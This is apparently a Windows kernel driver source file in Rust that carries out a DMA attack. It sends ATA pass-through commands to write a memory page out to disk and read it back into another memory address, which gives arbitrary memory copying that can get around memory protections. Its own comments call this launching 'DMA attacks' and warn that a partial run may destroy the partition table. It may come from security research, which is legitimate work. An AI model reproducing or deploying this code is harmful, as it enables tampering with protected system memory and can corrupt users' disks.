#[cfg(not(test))] extern crate wdk_panic;

use crate::CTL_CODE;
use core::ffi::*;
use ntddk::*;
use wdk::println;
use wdk_sys::*;

// It seems WDK crate neither defined this structure nor included related
// definitions. https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddscsi/ns-ntddscsi-_ata_pass_through_direct
#[repr(C)]
struct AtaPassThroughDirect
{
	length:u16,
	ata_flags:u16,
	path_id:u8,
	target_id:u8,
	lun:u8,
	reserved_as_u8:u8,
	data_transfer_length:u32,
	timeout_value:u32,
	reserved_as_u32:u32,
	data_buffer:*mut c_void,
	previous_taskfile:[u8; 8],
	current_taskfile:[u8; 8]
}

// Unused constants are under comments...
// const ATA_FLAGS_DRDY_REQUIRED:u16=1<<0;
const ATA_FLAGS_DATA_IN:u16 = 1 << 1;
const ATA_FLAGS_DATA_OUT:u16 = 1 << 2;
// const ATA_FLAGS_48BIT_COMMAND:u16=1<<3;
const ATA_FLAGS_USE_DMA:u16 = 1 << 4;
// const ATA_FLAGS_NO_MULTIPLE:u16=1<<5;

const ATA_IO_TIMEOUT:u32 = 2;
const ATA_CMD_READ_SECTORS:u8 = 0x20;
const ATA_CMD_WRITE_SECTORS:u8 = 0x30;
const ATA_DEVICE_TRANSPORT_LBA:u8 = 0x40;
const ATA_SECTOR_SIZE:u32 = 512;

const IOCTL_ATA_PASS_THROUGH_DIRECT:u32 = CTL_CODE!(FILE_DEVICE_CONTROLLER, 0x40C, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS);

// It seems WDK crate does not export certain undocumented APIs.
extern "C" {
	pub fn ObReferenceObjectByName(
		ObjectPath:PUNICODE_STRING, Attributes:ULONG, PassedAccessState:PACCESS_STATE, DesiredAccess:ACCESS_MASK, ObjectType:POBJECT_TYPE,
		AccessMode:KPROCESSOR_MODE, ParseContext:PVOID, ObjectPointer:*mut PVOID
	) -> NTSTATUS;
	pub static mut IoDriverObjectType: *mut POBJECT_TYPE;
}

pub struct DiskObject
{
	pub backup_data:[u8; 4096],
	pub device:*mut _DEVICE_OBJECT
}

fn issue_ata_cmd(device:*mut _DEVICE_OBJECT, flags:u16, cmd:u8, buffer:*mut c_void) -> NTSTATUS
{
	let mut st:NTSTATUS = STATUS_INSUFFICIENT_RESOURCES;
	// Initialize Event.
	let mut evt:KEVENT = Default::default();
	unsafe {
		KeInitializeEvent(&mut evt, _EVENT_TYPE::SynchronizationEvent, 0);
	}
	// Initialize Request.
	let mut req:AtaPassThroughDirect = AtaPassThroughDirect {
		length:size_of::<AtaPassThroughDirect>() as u16,
		ata_flags:flags | ATA_FLAGS_USE_DMA,
		path_id:0,
		target_id:0,
		lun:0,
		reserved_as_u8:0,
		data_transfer_length:PAGE_SIZE,
		timeout_value:ATA_IO_TIMEOUT,
		reserved_as_u32:0,
		data_buffer:buffer,
		previous_taskfile:[0, 0, 0, 0, 0, 0, 0, 0],
		current_taskfile:[0, (PAGE_SIZE / ATA_SECTOR_SIZE) as u8, 0, 0, 0, ATA_DEVICE_TRANSPORT_LBA, cmd, 0]
	};
	let mut iosb:IO_STATUS_BLOCK = Default::default();
	// Initialize IRP.
	let irp:*mut IRP = unsafe {
		IoBuildDeviceIoControlRequest(
			IOCTL_ATA_PASS_THROUGH_DIRECT,
			device,
			&mut req as *mut AtaPassThroughDirect as *mut c_void,
			size_of::<AtaPassThroughDirect>() as u32,
			&mut req as *mut AtaPassThroughDirect as *mut c_void,
			size_of::<AtaPassThroughDirect>() as u32,
			0,
			&mut evt as *mut KEVENT,
			&mut iosb as *mut IO_STATUS_BLOCK
		)
	};
	// Call the ATA Driver and wait.
	if irp != core::ptr::null_mut::<IRP>()
	{
		st = unsafe { IofCallDriver(device, irp) };
		if st == STATUS_PENDING
		{
			unsafe {
				let _ = KeWaitForSingleObject(
					&mut evt as *mut KEVENT as *mut c_void,
					_KWAIT_REASON::Executive,
					_MODE::KernelMode as i8,
					0,
					core::ptr::null_mut()
				);
				st = iosb.__bindgen_anon_1.Status;
			}
		}
	}
	return st;
}

fn ata_read_page(device:*mut DEVICE_OBJECT, destination:*mut c_void) -> NTSTATUS
{
	issue_ata_cmd(device, ATA_FLAGS_DATA_IN, ATA_CMD_READ_SECTORS, destination)
}

fn ata_write_page(device:*mut DEVICE_OBJECT, source:*mut c_void) -> NTSTATUS
{
	issue_ata_cmd(device, ATA_FLAGS_DATA_OUT, ATA_CMD_WRITE_SECTORS, source)
}

/**
  # Summary
  `ata_copy_memory` will copy data from source into disk, then copy data from disk to destination, and eventually recover the disk data. \
   All operations are done in DMA (Direct Memory Access) in order to launch the DMA attacks. \
  **Warning**: If this operation is not fully completed, the disk partition table might be destroyed.

  # Arguments
* `disk_obj`: Specify the `DiskObject`.
* `destination`: Pointer to the destination memory.
* `source`: Pointer to the source memory.

  # Return Value
  NTSTATUS is returned. See MSDN for explanations.
*/
pub fn ata_copy_memory(disk_obj:&mut DiskObject, destination:*mut c_void, source:*mut c_void) -> NTSTATUS
{
	let mut st:NTSTATUS = ata_write_page((*disk_obj).device, source);
	// Read from source memory by writing to the disk through DMA.
	if NT_SUCCESS(st)
	{
		// Write to destination memory by reading from the disk through DMA.
		st = ata_read_page((*disk_obj).device, destination);
		if NT_SUCCESS(st)
		{
			// Recover the original disk content.
			st = ata_write_page((*disk_obj).device, (*disk_obj).backup_data.as_mut_ptr() as *mut c_void);
			if !NT_SUCCESS(st)
			{
				println!("Failed to restore disk content! Status=0x{:08X}", st);
			}
		}
		else
		{
			println!("Failed to write to destination from disk! Status=0x{:08X}", st);
		}
	}
	else
	{
		println!("Failed to write to disk from source! Status=0x{:08X}", st);
	}
	return st;
}

fn get_device_list(driver:*mut DRIVER_OBJECT, device_count:&mut u32) -> Result<*mut PDEVICE_OBJECT, NTSTATUS>
{
	let mut st:NTSTATUS = unsafe { IoEnumerateDeviceObjectList(driver, core::ptr::null_mut(), 0, device_count) };
	if st != STATUS_BUFFER_TOO_SMALL
	{
		return Err(st);
	}
	let list_size:u32 = (*device_count) * (size_of::<PDEVICE_OBJECT> as u32);
	st = STATUS_INSUFFICIENT_RESOURCES;
	// FIXME: Use idiomatic Rust...
	unsafe {
		let device_list:*mut PDEVICE_OBJECT = ExAllocatePool(_POOL_TYPE::NonPagedPool, list_size as u64) as *mut PDEVICE_OBJECT;
		if device_list != core::ptr::null_mut() as *mut PDEVICE_OBJECT
		{
			st = IoEnumerateDeviceObjectList(driver, device_list, list_size, device_count);
			if !NT_SUCCESS(st)
			{
				ExFreePool(device_list as PVOID);
				return Err(st);
			}
			return Ok(device_list);
		}
	}
	
	return Err(st);
}

/**
   # Summary
   `find_disk` will find a disk that can accept AHCI DMA operations and initialize the DiskObject.

   # Arguments
   * `disk_obj``: An already-allocated empty object to be initialized.

   # Return Value
   NTSTATUS is returned. See MSDN for explanations.
*/
pub fn find_disk(disk_obj:&mut DiskObject) -> NTSTATUS
{
	let mut disk_drv_obj:PDRIVER_OBJECT = core::ptr::null_mut();
	let mut st:NTSTATUS = unsafe {
		let disk_drv_name_raw:[u16; 13] = [0x5c, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x5c, 0x44, 0x69, 0x73, 0x6b, 0];
		let mut disk_drv_name:UNICODE_STRING = Default::default();
		RtlInitUnicodeString(&mut disk_drv_name, disk_drv_name_raw.as_ptr());
		ObReferenceObjectByName(
			&mut disk_drv_name,
			OBJ_CASE_INSENSITIVE,
			core::ptr::null_mut(),
			0,
			*IoDriverObjectType,
			_MODE::KernelMode as i8,
			core::ptr::null_mut(),
			&mut disk_drv_obj as *mut PDRIVER_OBJECT as *mut PVOID
		)
	};
	if NT_SUCCESS(st)
	{
		let mut dev_count:u32 = 0;
		let r:Result<*mut PDEVICE_OBJECT, NTSTATUS> = get_device_list(disk_drv_obj, &mut dev_count);
		match r
		{
			Ok(device_list) =>
			{
				st = STATUS_NOT_FOUND;
				println!("Found {} disk devices!", dev_count);
				for i in 0..dev_count
				{
					let dev_obj:PDEVICE_OBJECT = unsafe { *device_list.offset(i as isize) };
					println!("Trying Device Object 0x{:p}...", dev_obj);
					if st != STATUS_NOT_FOUND
					{
						println!("Device Object 0x{:p} is ignored because we've already found a DMA-capable ATA disk!", dev_obj);
					}
					else
					{
						// Try to read a page from the disk.
						st = ata_read_page(dev_obj, (*disk_obj).backup_data.as_mut_ptr() as *mut c_void);
						if NT_SUCCESS(st)
						{
							// A successful read means this disk supports ATA and it can perform DMA.
							disk_obj.device = dev_obj;
							println!("Device Object 0x{:p} can use DMA! Buffer: 0x{:p}", dev_obj, (*disk_obj).backup_data.as_ptr());
							st = STATUS_SUCCESS;
							continue;
						}
						else
						{
							// Either ATA commands can't be used on this disk or DMA failed.
							// Reset the status.
							println!("Device Object 0x{:p} cannot use DMA!", dev_obj);
							st = STATUS_NOT_FOUND;
						}
					}
					// Reference must be matched with a dereference.
					unsafe {
						ObfDereferenceObject(dev_obj as PVOID);
					}
				}
				unsafe {
					ExFreePool(device_list as PVOID);
				}
			}
			Err(s) =>
			{
				println!("Failed to get device list! Status: 0x{:08X}", s);
				st = s;
			}
		}
		// Reference must be matched with a dereference.
		unsafe {
			ObfDereferenceObject(disk_drv_obj as PVOID);
		}
	}
	return st;
}
